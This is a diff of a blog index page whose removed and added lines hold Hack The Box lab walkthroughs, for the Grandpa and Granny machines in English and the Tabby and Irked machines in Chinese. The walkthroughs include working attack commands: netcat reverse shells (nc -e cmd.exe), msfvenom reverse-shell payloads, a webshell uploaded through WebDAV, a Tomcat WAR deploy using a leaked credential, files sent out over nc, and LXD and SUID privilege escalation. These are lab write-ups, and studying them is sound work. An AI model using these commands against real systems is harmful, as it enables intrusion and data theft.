-<img src="/2022/07/22/Grandpa/webshell.png">
-but all users directory we all can't get in
-<img src="/2022/07/22/Grandpa/accessdeny.png">
-
-<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>we can try many path to write</p>
-<pre><code>echo test &gt; test.txt
-</code></pre>
-<p>but many directory failed<br>in the root directory,we can find a unique dir called wmpub<br><img src="/2022/07/22/Grandpa/wmpub.png"><br>and we can success write into this directory<br><img src="/2022/07/22/Grandpa/wmpubwrite.png"><br><code>icacles</code> shows that as well:<br><img src="/2022/07/22/Grandpa/icacls.png"><br>That Userss can <code>WD</code> decodes to write data&#x2F;add files.<br>use systeminfo and <a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">windows-exploit-suggester</a> to find if there is something can use<br>    pip2 install xlrd&#x3D;&#x3D;1.2.0<br>    python2 windows-exploit-suggester.py -i systeminfo.txt –database 2022-07-22-mssb.xls<br><img src="/2022/07/22/Grandpa/suggest1.png"><br><img src="/2022/07/22/Grandpa/suggest2.png"><br>but these don’t work<br>check the privs<br><img src="/2022/07/22/Grandpa/suggest2.png"><br><code>SEImpersonalPrivilege</code> is one I know to look out for. For modern boxes, that means a potato exploit (juicy, lonely, rotten). But for 2003, it’s better to start with <a target="_blank" rel="noopener" href="https://github.com/Re4son/Churrasco/">churrasco</a>.</p>
-<h5 id="churrasco"><a href="#churrasco" class="headerlink" title="churrasco"></a>churrasco</h5><p>first,make a smb directory and put the churrasco.exe into it<br><img src="/2022/07/22/Grandpa/smbpack.png"><br>second,use<code>impack-smbserver smb smb</code> to start a smb server to let the target machine get the churrasco.exe<br>we should made sure the Churrasco.exe file was in a directory called SMB on Kali machine.<br><img src="/2022/07/22/Grandpa/smbserver.png"><br>now we can use target machine to connect our smbshare <code>net use \\10.10.16.10\smb</code><br><img src="/2022/07/22/Grandpa/netuse.png"><br>once we connected,use <code>copy \\10.10.16.10\smb\churrasco.exe</code> and <code>copy \\10.10.16.10\smb\nc.exe</code><br><img src="/2022/07/22/Grandpa/smbcopy.png"><br><img src="/2022/07/22/Grandpa/smbcopy2.png"><br>Once the files are copied, execute churrasco with the following command: .\churrasco.exe “C:\wmpub\nc.exe -e cmd.exe 10.10.16.10 8999”<br>And we get the root access</p>
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/03/tabby/nmap.png">
+#### port explore
+22
+80:80是一个bootstrap themes搭起来的网站
+8080:8080是一个tomcat部署成功的默认界面,尝试了默认密码没有成功
+#### 目录扫描
+<img src="/2022/09/03/tabby/80.png">
+<img src="/2022/09/03/tabby/8080.png">
+先看80端口的readme表明是一个模板创建的，assets目录不允许访问，index.php/login好像也不能访问，80端口的news指向了一个megahosting.htb的域名，先将他的信息添加到/etc/hosts中，然后访问，得到一个信息是之前存在一个数据泄漏，但现在已经被移除了
+看8080端口的页面，一个manage需要登录
+#### get tomcat cred
+<img src="/2022/09/03/tabby/info.png">
+根据之前的提示，我们可以尝试文件包含，确认存在文件包含漏洞
+tomcat说users都被定义在/etc/tomcat9/tomcat-users.xml中
+但是没有内容，在搜索后得出tomcat9的配置文件有两个
+usr/share/tomcat9/etc/tomcat-users.xml是另一个配置文件存在的地方
+<img src="/2022/09/03/tabby/tomcat.png">
+得到用户名密码为tomcat-$3cureP4s5w0rd123!
+该用户能登录到host-manager界面
+rolename存在admin-gui和manager-script
+manager-scrript允许我们访问text-based web service located at /manager/text
+尝试访问/manager/text/list
+<img src="/2022/09/03/tabby/list.png">
+这样我们就拥有了部署war包的权限
+使用msfvenom生成一个war
+`msfvenom -p java/shell_reverse_tcp lhost=10.10.14.4 lport=8888 -f war -o rev.10.10.14.4-8888.war`
+传上去试一下
+`curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/abc --upload-file rev.10.10.14.14-8888.war`
+<img src="/2022/09/03/tabby/upload.png">
+访问文件触发,获得了tomcat的权限
+<img src="/2022/09/03/tabby/user.png">
+`python3 -c 'import pty;pty.spawn("bash")'`提升shell模式
+在/var/www/html/files中有一个所有者是ash的backup文件
+用nc把它拷到本地
+`
+cat 16162020_backup.zip | nc 10.10.14.4 9999
+nc -lvnp 9999 > 16162020_backup.zip
+`
+用zip2john创建这个zip的hash
+`zip2john 16162020_backup.zip -o 16162020_backup.zip.john`
+用john破解zip的密码
+<img src="/2022/09/03/tabby/zip.png">
+密码是admin@it
+切换到ash
+<img src="/2022/09/03/tabby/userflag.png">
+#### root
+先尝试sudo -l,发现没有
+传一个linenum.sh上去
+<img src="/2022/09/03/tabby/id.png">
+adm 权限可以读取log files
+#### lxd提权
+创建一个容器挂载到root下面，然后就能够获得root的权限
+<img src="/2022/09/03/tabby/lxclist.png">
+目前该机器上并没有挂载容器
+先下载一个container到本机
+(LXD Alpina Linux image builder)[https://github.com/saghul/lxd-alpine-builder.git]
+这个工具创建了一个LXD Alpina Linux container image 
+把生成的tar.gz传到靶机
+接下来将该镜像导入lxc
+`lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias abcimage`
+`lxd init`
+`lxc init abcimage abccontainer -c security.privileged=true`
+`lxc config device add abccontainer abcdevice disk source=/ path=/mnt/root recursive=true`
+<img src="/2022/09/03/tabby/list2.png">
+`lxc start abccontainer`
+<img src="/2022/09/03/tabby/list3.png">
+`lxc exec abccontainer /bin/sh`
+<img src="/2022/09/03/tabby/root.png">
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/22/Grandpa/" data-id="cl7edtt480006jtcpdtpghdiq" data-title="Grandpa" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/03/tabby/" data-id="cl7lzagut00001ecp6mq26uen" data-title="tabby" class="article-share-link">Share</a>
       
       
       
@@ -1102,10 +849,10 @@ but all users directory we all can't get in
 
 
   
-    <article id="post-Granny" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-irked" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/21/Granny/" class="article-date">
-  <time class="dt-published" datetime="2022-07-21T11:25:32.000Z" itemprop="datePublished">2022-07-21</time>
+    <a href="/2022/09/03/irked/" class="article-date">
+  <time class="dt-published" datetime="2022-09-03T05:54:07.000Z" itemprop="datePublished">2022-09-03</time>
 </a>
     
   </div>
@@ -1116,7 +863,7 @@ but all users directory we all can't get in
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/21/Granny/">Granny</a>
+      <a class="p-name article-title" href="/2022/09/03/irked/">irked</a>
     </h1>
   
 
@@ -1124,71 +871,49 @@ but all users directory we all can't get in
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/21/Granny/nmap.png">
-it just open port 80,and the web page is a default error page
-<img src="/2022/07/21/Granny/webpage.png">
-the header shows that it's a ASP.NET,so if we can upload aspx files to it,it can excute
-<img src="/2022/07/21/Granny/asp.png">
-use dirsearch to dig pages
-<img src="/2022/07/21/Granny/dirsearch.png">
-
-<h5 id="webDAV"><a href="#webDAV" class="headerlink" title="webDAV"></a>webDAV</h5><p>Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP.<br><img src="/2022/07/21/Granny/webDAV.png"><br>we can use <a href>davtest</a> to explore further, and it will show me what types of files can be uploaded, and if it can create a directory:</p>
-<pre><code>davtest -url http:10.10.10.15
-</code></pre>
-<img src="/2022/07/21/Granny/davtest.png">
-It looks like there are a lot of file type I can upload, but not aspx, which is what I want.
-The next step is to manul test dav
-First, I’ll put up a text file and verify it’s there:
-
-<pre><code>echo &quot;it&#39;s a test text&quot; &gt; test.txt
-curl -X PUT http://10.10.10.15/123.txt -d @test.txt
-curl http://10.10.10.15/123.txt
-</code></pre>
-<img src="/2022/07/21/Granny/curl.png">
-The first curl puts the file onto the webserver, and the second proves it’s there. The -d @123.txt syntax says that the data for the request should be the contents of the file text.txt.
-Now let's try with .aspx:
-<img src="/2022/07/21/Granny/aspx.png">
-unfortunately,it's really can't allow us to upload aspx
-
-<p>There’s a tool called <code>cadaver</code> that provides command-line WebDAV interactions with a slightly simpler syntax than curl. If I are going to be attacking a WebDAV server, I’ll probably use that just for the shorter commands. That said, I’m going to use <code>curl</code> in this post to show exactly what is happening when I issue these HTTP requests.<br><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/cadaver">cadaver</a></p>
-<h4 id="2-get-webshell-access"><a href="#2-get-webshell-access" class="headerlink" title="2.get webshell access"></a>2.get webshell access</h4><p>Kali has a simple one at <code>/usr/share/webshells/aspx/cmdasp.aspx</code>, we should copy it </p>
-<pre><code>cp /usr/share/webshells/aspx/cmdasp.aspx .
-</code></pre>
-<p>And now we can upload that to target as a txt using curl and the http put method:</p>
-<pre><code>curl -X PUT http://10.10.10.15/shell.txt -d @cmdasp.aspx
-</code></pre>
-<p>we can see the site deal the shell as the plain text<br><img src="/2022/07/21/Granny/shelltxt.png"><br>Now we can use the next webdav command, MOVE. Again, I can do this with curl:</p>
-<pre><code>curl -X MOVE -H &#39;Destination:http://10.10.10.15/shell.aspx&#39; http://10.10.10.15/shell.txt
-</code></pre>
-<ul>
-<li>-X MOVE - use the MOVE method</li>
-<li>-H ‘Destination:<a target="_blank" rel="noopener" href="http://10.10.10.15/shell.aspx&#39;">http://10.10.10.15/shell.aspx&#39;</a> - defines where to move to</li>
-<li><a target="_blank" rel="noopener" href="http://10.10.10.15/shell.txt">http://10.10.10.15/shell.txt</a> - the file to move<br>and now we can get a shell<img src="/2022/07/21/Granny/webshell.png"></li>
-</ul>
-<h5 id="reverse-a-shell"><a href="#reverse-a-shell" class="headerlink" title="reverse a shell"></a>reverse a shell</h5><p>using msf,we can reverse a shell</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f aspx &gt; msf.aspx
-</code></pre>
-<p>like the step before,upload it and change it to aspx:</p>
-<pre><code>curl -X PUT http://10.10.10.15/msf.txt -d @msf.aspx
-curl -X MOVE -H &#39;Destination: http://10.10.10.15/msf.aspx&#39; http://10.10.10.15/msf.txt
-</code></pre>
-<p>start msf</p>
-<pre><code>use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-</code></pre>
-<p>try to trigger it,but failed<br><img src="/2022/07/21/Granny/fail.png"><br>upload it again,and we will see the whitespace is all jacked up:<br><img src="/2022/07/21/Granny/whitespace.png"><br>upload again and use <code>--data-binary</code> to preserve endlines and other control characters</p>
-<pre><code>curl -X PUT http://10.10.10.15/msf.txt --data-binary @msf.aspx
-</code></pre>
-<p>and this time we can see it cleaner:<br><img src="/2022/07/21/Granny/msf.png"></p>
-<pre><code>curl -X MOVE -H &#39;Destination: http://10.10.10.15/msf.aspx&#39; http://10.10.10.15/msf.txt
-</code></pre>
-<p>trigger it,and we can get s shell<br><img src="/2022/07/21/Granny/shell.png"></p>
-<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>First to checkout local exploits, and Metasploit has a nice module for that, <code>post/multi/recon/local_exploit_suggester</code><br><img src="/2022/07/21/Granny/localsuggest.png"><br>and we can use ms14-058<br>finally,we get the root<br><img src="/2022/07/21/Granny/root.png"></p>
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/03/irked/nmap.png">
+#### port explore
+22端口需要登录
+80端口是一张图片
+111端口可能是rpc服务
+剩下的端口不知道干什么的
+#### 目录扫描
+<img src="/2022/09/03/irked/dir.png">
+扫到一个apache的手动目录
+#### exploits
+searchsploit高端口的unrealircd,会发现几个可以利用的版本
+直接去github上找一个同样的py脚本
+<img src="/2022/09/03/irked/user.png">
+查找user.txt发现在另一个使用者目录下，但是我们现在没有权限
+#### shell as djmardov
+在documents目录下存在一个.backup
+<img src="/2022/09/03/irked/bak.png">
+先下载一个大图
+steghide(命令行下的steg工具)
+`
+extract - 提取数据
+-sf irked.jpg - 抽取数据的目标
+-p - 密码
+`
+得到一个密码
+<img src="/2022/09/03/irked/pass.png">
+试着用这个密码登录到djmardov
+成功切换到该用户
+#### shell as root
+用ssh连接刚才的用户登录到目标机器
+传一个linenum.sh到上面
+在suid的文件中，有一个viewuser没见过
+<img src="/2022/09/03/irked/viewuser.png">
+测试一下往/tmp/listusers里面echo id
+<img src="/2022/09/03/irked/id.png">
+命令能够成功执行
+echo sh > /etc/listusers
+<img src="/2022/09/03/irked/root.png">
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/21/Granny/" data-id="cl7edtt490007jtcp186nb8mm" data-title="Granny" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/03/irked/" data-id="cl7ljp8uh0000m7cpcfvf5u8u" data-title="irked" class="article-share-link">Share</a>
       
       
       
@@ -1204,7 +929,7 @@ set payload windows/meterpreter/reverse_tcp
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -1223,7 +948,7 @@ set payload windows/meterpreter/reverse_tcp
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
     </div>
   </div>
 
@@ -1236,23 +961,23 @@ set payload windows/meterpreter/reverse_tcp
       <ul>
         
           <li>
-            <a href="/2022/08/30/Networked/">Networked</a>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
           </li>
         
           <li>
-            <a href="/2022/08/29/Buff/">Buff</a>
+            <a href="/2022/09/06/haircut/">haircut</a>
           </li>
         
           <li>
-            <a href="/2022/08/29/Arctic/">Arctic</a>
+            <a href="/2022/09/06/cronos/">cronos</a>
           </li>
         
           <li>
-            <a href="/2022/08/28/Devel/">Devel</a>
+            <a href="/2022/09/06/bastard/">bastard</a>
           </li>
         
           <li>
-            <a href="/2022/07/28/oscp/">oscp</a>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
           </li>
         
       </ul>
